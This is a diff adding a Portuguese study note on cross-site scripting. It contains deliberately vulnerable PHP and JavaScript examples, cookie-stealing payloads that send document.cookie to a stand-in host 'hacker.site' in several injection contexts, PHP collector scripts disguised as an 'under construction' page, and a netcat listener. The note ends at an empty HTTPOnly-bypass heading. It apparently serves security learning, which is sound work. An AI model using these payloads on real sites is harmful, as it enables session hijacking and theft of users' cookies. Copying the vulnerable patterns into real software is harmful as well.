@@ -1,0 +1,151 @@
+O XSS acontece quando o browser renderiza conteúdos não confiáveis em um ambiente confiável. Se o conteúdo enviado contém uma linguagem dinâmica como HTML, JavaScript ou outro, o conteúdo vai ser executado
+
+XSS pode ser dividido em duas categorias principais:
+- Server-side
+- Client-side (impacta somente o cliente)
+
+## Reflected XSS
+
+Ocorre quando dados não confiáveis são enviados pelo usuário para uma aplicação web e a resposta é imediatamente mostrada na tela
+
+Exemplo de um código PHP com esse tipo de vulnerabilidade:
+```php
+<?php $name = @$_GET['name']; ?>
+Welcome <?=$name?>
+```
+
+Normalmente para explorar essa vulnerabilidade é preciso criar links e envolve um pouco de engenharia social
+
+## Persistent XSS
+
+Também conhecido como Stored XSS, é similar ao reflected mas o seu conteúdo fica armazenado na aplicação web, dessa forma todos os visitantes da página são atingidos
+
+Exemplo de um código PHP com esse tipo de vulnerabilidade:
+```php
+// Newcomers Logging System
+<?php
+$file = 'newcomers.log';
+if(@$_GET['name']){
+	$current = file_get_contents($file);
+	$current .= $_GET['name']."\n";
+	// Store the newcomer
+	file_put_contents($file, $current);
+}
+// If admin show newcomers
+if(@$_GET['admin']==1)
+	echo file_get_contents($file);
+```
+
+## DOM XSS
+
+É um tipo de XSS que acontece somente do lado do cliente. É muito similar ao Reflected XSS mas não interage com o servidor
+
+Exemplo de um código vulnerável:
+```html
+<h1 id='welcome'></h1>
+<script>
+	var w = "Welcome ";
+	var name = document.location.hash.substr(
+		document.location.hash.search(/#w!/i)+3,
+		document.location.hash.length
+	);
+	document.getElementById('welcome').innerHTML = w + name;
+</script>
+```
+
+https://code.google.com/archive/p/domxsswiki/
+## Universal XSS
+
+Diferente dos outros 3 tipos de XSS o universal XSS não explora falhas em códigos, mas em browsers, extensões e plugins
+# XSS Attacks
+
+Para que o XSS pode ser usado?
+## Cookie Gathering
+
+O XSS pode ser usado para obter cookies de usuários, afim de obter informações sensíveis ou realizar um roubo de sessão
+
+Normalmente o roubo de cookies possui 3 passos:
+- Script Injection
+- Cookie recording
+- Logging
+### Script Injection
+
+Onde é injetado o payload malicioso que vai enviar os cookies para o nosso servidor. O DOM nos permite acessar os cookies usando o ```document.cookie```
+
+Para realizar o roubo do cookie, é preciso enviar o conteúdo do document.cookie para algum lugar onde temos controle, isso pode ser feito usando um script como:
+```javascript
+new Image().src="http://hacker.site/C.php?cc="+escape(document.cookie);
+```
+
+Opções para diferentes cenários:
+```html
+<!-- Script Variable -->
+<script> var a=">>INJ<<"; </script>
+-> ";new Image().src="http://hacker.site/C.php?cc="+escape(document.cookie);//
+-> ";new Audio().src="http://hacker.site/C.php?cc="+escape(document.cookie);//
+
+<!-- Attribute -->
+<div id=">>INJ<<">
+-> x" onmouseover="new Image().src='http://hacker.site/C.php?cc='+escape(document.cookie)
+
+<video width="320" height=">>INJ<<">
+-> 240' src=x onerror="new Audio().src='http://hacker.site/C.php?cc='+escape(document.cookie)
+
+<!-- HREF -->
+<a href="victim.site/#>>INJ<<">
+-> x" onclick="new Image().src='http://hacker.site/C.php?cc='+escape(document.cookie)
+```
+
+### Cookie Recording & Logging
+
+São os próximos passos, nesse momento já temos uma requisição sendo feita enviando as informações para o nosso servidor, então é necessário tratar e armazenar essa informação
+
+Seguindo o exemplo anterior, podemos supor que temos um script PHP escutando no nosso servidor e esse script vai armazenar as informações em um arquivo
+
+Uma forma simples se fazer esse script é:
+```php
+<?php
+error_reporting(0); # Turn off all error reporting
+
+$cookie = $_GET['cc']; # request to log
+$file = '_cc_.txt'; # the log file
+$handle = fopen($file,"a"); # Open log file in append mode
+
+# Append the cookie
+fwrite($handle,$cookie."\n"); 
+fclose($handle); 
+
+echo '<h1>Page Under Construction</h1>'; # Trying to hide suspects...
+```
+
+Em um cenário onde temos um único servidor recebendo informações de múltiplas páginas web que foram exploradas, é necessário deixar o código um pouco mais complexo, adicionando algumas informações a mais que ajudaram a identificar a origem
+
+Uma forma mas avançada:
+```php
+<?php error_reporting(0); # Turn off all error reporting
+function getVictimIP(){...} # Function that returns th victim IP
+function collect(){
+	$file = '_cc_.txt'; # tho log file
+	$date = date("1 dS of F Y h:i:s A"); # Date
+	$IP = gitVictimIP(); # A function that returns victim IP
+	$cookie = $SERVER['QUERY_STRING']; # All query string
+	$info = "** other valuable information **";
+
+	$log = "[$date]\n\t> Victim IP: $IP\n\t> Cookies: $cookie\n\t> Extra info: $info\n";
+	$handle = fopen($file,"a"); # Open log file in append mode
+	fwrite($handle,$log."\n\n"); 
+	fclose($handle);
+}
+collect();
+echo '<h1>Page Under Construction</h1>'; # Trying to hide suspects...
+```
+#### Netcat
+
+Se precisa de uma solução rápida para receber os cookies, pode ser usado o netcat
+
+```shell
+sudo nc -lnvp 80
+```
+
+### Bypassing HTTPOnly Flag
+
